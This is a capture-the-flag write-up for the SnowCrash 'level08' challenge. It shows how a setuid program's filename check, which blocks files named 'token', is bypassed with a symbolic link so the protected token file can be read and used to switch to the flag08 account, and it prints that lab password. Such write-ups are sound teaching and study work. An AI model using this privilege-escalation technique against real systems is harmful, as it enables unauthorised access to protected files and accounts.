# Level08

## Research

```bash
level08@SnowCrash:~$ ls -l
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

```bash
level08@SnowCrash:~$ ./level08
./level08 [file to read]

level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

```bash
level08@SnowCrash:~$ strings level08
[...]
printf
strstr
read
open
[...]
token
```

We can see that the programs calls strstr and that 'token' is hard written in the code.
Maybe it won't read anyfile with 'token' in the name.

```bash
level08@SnowCrash:~$ echo 'hello' > /tmp/hello
level08@SnowCrash:~$ ./level08 /tmp/hello
hello
level08@SnowCrash:~$ ./level08 /tmp/cctoken
You may not access '/tmp/cctoken'
```
The theory seems true: the program will open, read and print anyfile which doesn't have token in its name.

How to make it access and read `token` through a file not named 'token'?

## Solution

https://techterms.com/definition/symbolic_link

We can use symbolic links: </br>

```bash
level08@SnowCrash:~$ ln -s ~/token /tmp/link
level08@SnowCrash:~$ ./level08 /tmp/link
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXX
```
